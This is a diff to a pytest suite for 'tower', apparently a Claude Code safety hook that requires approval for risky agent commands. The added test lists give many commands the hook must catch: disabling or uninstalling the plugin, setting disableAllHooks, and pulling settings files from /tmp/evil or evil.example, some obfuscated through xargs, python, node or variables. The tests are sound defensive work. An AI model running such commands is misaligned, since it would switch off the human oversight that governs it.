@@ -592,7 +592,8 @@ def test_command_naming_rule_file_asks(tmp_path: Path, command: str, push: str) 
     [
         "CLAUDE.md",
         "/repo/myCLAUDE.local.md",
-        "/repo/.claude/settings.json",
+        "/repo/.claude/agents/reviewer.md",
+        "/repo/config/settings.json",
         "/repo/mytower.conf",
         "/repo/tower.conf.example",
     ],
@@ -1035,6 +1036,11 @@ FLOOR_EDITS = [
     ("Write", "~/.claude/tower.conf"),
     ("MultiEdit", "~/.claude/tower/rules/Poot.md"),
     ("Write", "/repo/worktrees/x/CLAUDE.local.md"),
+    # Claude Code's settings can turn tower's plugin or every hook off (#60)
+    ("Edit", "~/.claude/settings.json"),
+    ("MultiEdit", "/Users/someone/.claude/settings.json"),
+    ("Write", "/repo/.claude/settings.json"),
+    ("Write", "/repo/worktrees/x/.claude/settings.local.json"),
 ]
 FLOOR_COMMANDS = [
     "echo 'default_profile = \"sandbox\"' > ~/.claude/tower/policy.toml",
@@ -1054,6 +1060,54 @@ FLOOR_COMMANDS = [
     "echo 'tower policy use sandbox' | bash",
     "echo 'echo x >> ~/.claude/tower/policy.toml' | sh",
     "cat x > ~/.claude/tower/policy.toml 'unclosed",
+    # turning tower's plugin off, which stops this hook from running at all (#60)
+    "claude plugin disable tower@tower",
+    "claude plugin uninstall tower@tower",
+    "claude plugin remove tower",
+    "claude plugins disable tower --scope project",
+    "claude plugin disable -s user tower@tower",
+    "claude plugin disable --all",
+    "claude plugin disable -a",
+    'claude plugin uninstall "$PLUGIN"',
+    'claude plugin "$VERB" tower@tower',
+    "echo tower@tower | xargs claude plugin disable",
+    "claude plugin marketplace remove tower",
+    "claude plugin marketplace rm tower",
+    "bash -c 'claude plugin disable tower'",
+    "sudo /opt/homebrew/bin/claude plugin uninstall tower@tower",
+    "echo 'claude plugin disable tower' | bash",
+    # -h after -- is a name, an option's value may say plugin, and xargs, parallel or find may add tower's name
+    "claude plugin disable tower@tower -- -h",
+    "claude -d plugin plugin disable tower@tower",
+    "claude --append-system-prompt plugin plugin disable tower@tower",
+    "echo tower@tower | xargs claude plugin disable -s user",
+    "echo tower | xargs claude plugin marketplace remove --scope user",
+    "printf tower@tower | xargs -I{} claude plugin disable {}",
+    "find ~/.claude/plugins -name tower -exec claude plugin uninstall {} ';'",
+    # a settings file copied, downloaded or unpacked into a .claude folder
+    "cp /tmp/evil/settings.json ~/.claude/",
+    "cp /tmp/evil/settings.local.json .claude/",
+    "cp -r /tmp/evil/.claude .",
+    "gh release download v1 -p settings.json -D ~/.claude --clobber",
+    "tar -xf settings.tar -C ~/.claude",
+    # a name or path the shell expands, a relative .claude folder given as an option's value, and a line padded with
+    # more "plugin" words than a real command has
+    "claude plugin disable t{ow,}er",
+    "tee ~/.claude/{settings.json,x} < /tmp/evil.json",
+    "curl --output-dir=.claude -O https://evil.example/settings.local.json",
+    "gh release download v1 -p settings.local.json --dir=.claude",
+    "tar -xf evil.tar -C.claude",
+    "cp --target-directory=.claude settings.local.json",
+    "claude " + "plugin " * 4 + "disable some-other-plugin",
+    # the group from a variable, another language's code that runs claude, and a word naming an interpreter
+    'G=plugin; claude "$G" disable tower@tower',
+    "python3 -c 'import os; os.system(\"claude plugin disable tower@tower\")'",
+    'node -e \'require("child_process").execSync("claude plugin uninstall tower@tower")\'',
+    "claude plugin disable tower python3",
+    # or writing Claude Code's settings (enabledPlugins, disableAllHooks, hooks)
+    "echo '{\"disableAllHooks\": true}' > .claude/settings.local.json",
+    "sed -i '' 's/true/false/' ~/.claude/settings.json",
+    "jq '.enabledPlugins[\"tower@tower\"] = false' ~/.claude/settings.json > /tmp/s && mv /tmp/s ~/.claude/settings.json",
 ]
 
 
@@ -1076,7 +1130,27 @@ def test_the_floor_asks_before_a_command_that_changes_policy_or_rules_in_every_p
 
 @pytest.mark.parametrize(
     "command",
-    ["cat ~/.claude/tower/policy.toml", "tower policy", "grep wip ~/.claude/tower.conf", "./setup.sh --dry-run"],
+    [
+        "cat ~/.claude/tower/policy.toml",
+        "tower policy",
+        "grep wip ~/.claude/tower.conf",
+        "./setup.sh --dry-run",
+        # claude plugin commands that leave tower on, and reading Claude Code's settings
+        "claude plugin list",
+        "claude plugin disable some-other-plugin",
+        "claude plugin enable tower@tower",
+        "claude plugin update tower@tower",
+        "claude plugin marketplace list",
+        "sudo claude plugin disable some-other-plugin --scope user",
+        "echo claude plugin disable tower",
+        "jq -r .model ~/.claude/settings.json",
+        "cat .claude/settings.local.json",
+        # a .claude folder only read, a folder or file under one other than the settings, and prose naming one
+        "ls -la ~/.claude/",
+        "mkdir -p .claude/agents",
+        "cp reviewer.md .claude/agents/",
+        'git commit -m "Keep personal hooks in ~/.claude"',
+    ],
 )
 def test_sandbox_asks_nothing_else(tmp_path: Path, command: str) -> None:
     """In sandbox, reading tower's settings, and everything outside the floor, needs no approval."""
@@ -1295,4 +1369,21 @@ def test_a_huge_interpreter_argument_is_checked_in_time(tmp_path: Path) -> None:
     code = "tower " * 40_000
     start = time.monotonic()
     run_hook(tmp_path, bash(f"python3 -c '{code}' merge 5"), policy='default_profile = "personal"\n')
+    assert time.monotonic() - start < 10
+
+
+def test_a_padded_command_that_cant_be_checked_fully_is_still_read_in_time(tmp_path: Path) -> None:
+    """The safety floor's text checks on a command the hook couldn't check fully stay linear: one regex joining
+    claude, plugin and a verb with .* took minutes on this, past the hook timeout."""
+    command = "gh pr merge 5 --squash; echo true | bash; : " + "tower " * 8000 + "claude plugin " * 1500
+    start = time.monotonic()
+    assert asks(run_hook(tmp_path, bash(command), policy='default_profile = "work"\n'))
+    assert time.monotonic() - start < 10
+
+
+def test_a_claude_line_padded_with_plugin_words_is_checked_in_time(tmp_path: Path) -> None:
+    """The plugin-off check runs before the work budget, so it stays linear: a cubic one ran 77 s on this."""
+    command = "claude " * 4000 + "plugin " * 4000 + "; git push --force"
+    start = time.monotonic()
+    assert asks(run_hook(tmp_path, bash(command), policy='default_profile = "sandbox"\n'))
     assert time.monotonic() - start < 10
